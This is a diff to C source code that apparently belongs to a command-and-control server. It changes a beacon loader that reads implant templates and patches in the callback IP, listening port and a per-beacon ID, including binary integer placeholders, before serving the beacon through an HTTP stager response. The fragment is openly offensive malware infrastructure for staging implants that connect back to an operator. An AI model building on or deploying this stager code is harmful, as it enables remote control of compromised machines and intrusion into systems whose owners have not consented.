@@ -364,7 +364,7 @@ char* stager_req_ip(char* req) {
     r = strtok(r, "\n");
     return r;
 }
-char* load_beacon(char* type) {
+char* load_beacon(char* type, int id) {
     char* path = malloc(256 + 8);
     strcpy(path, "./src/beacons/");
     strcat(path, type);
@@ -383,12 +383,13 @@ char* load_beacon(char* type) {
     beacon[fsize] = 0;
 
     // Replace any occurances of ${C2_IP} with host and ${C2_PORT} with lp_port
+    int int_placeholder = 12345;
     char* str_c2_port = malloc(6);
     sprintf(str_c2_port, "%d", c2_port);
     char* str_lp_port = malloc(6);
     sprintf(str_lp_port, "%d", lp_port);
-    for (int i = 0; i < fsize - 8; i++) {
-        if (strncmp(beacon + i, "${C2_IP_XXXXXX}", 15) == 0) {
+    for (int i = 0; i < fsize - 15; i++) {
+        if (strncmp(beacon + i, "${C2_IP_XXXXXX}", 15) == 0 || strncmp(beacon + i, "XXX.XXX.XXX.XXX", 15) == 0) {
             memcpy(beacon + i, listen_ip, strlen(listen_ip));
             memcpy(beacon + i + strlen(listen_ip), beacon + i + 15, fsize - i - 15);
             beacon[fsize - 15 + strlen(listen_ip)] = 0;
@@ -408,6 +409,17 @@ char* load_beacon(char* type) {
             beacon[fsize - 10 + strlen(str_lp_port)] = 0;
         }
     }
+    for (int i = 0; i < fsize - 4; i++) {
+        if (memcmp(beacon + i, &int_placeholder, 4) == 0) {
+            memcpy(beacon + i, &lp_port, 4);
+        }
+    }
+    int_placeholder = 54321;
+    for (int i = 0; i < fsize - 4; i++) {
+        if (memcmp(beacon + i, &int_placeholder, 4) == 0) {
+            memcpy(beacon + i, &id, 4);
+        }
+    }
     return beacon;
 }
 
@@ -418,7 +430,7 @@ char* gen_stager_resp(int id, char* host) {
         error("Invalid beacon ID\n");
         return resp;
     }
-    char* beacon = load_beacon(beacons[id].type);
+    char* beacon = load_beacon(beacons[id].type, id);
     if (beacon == NULL) {
         char* resp = malloc(256);
         strcpy(resp, "HTTP/1.1 404 Not Found\r\n\r\n");
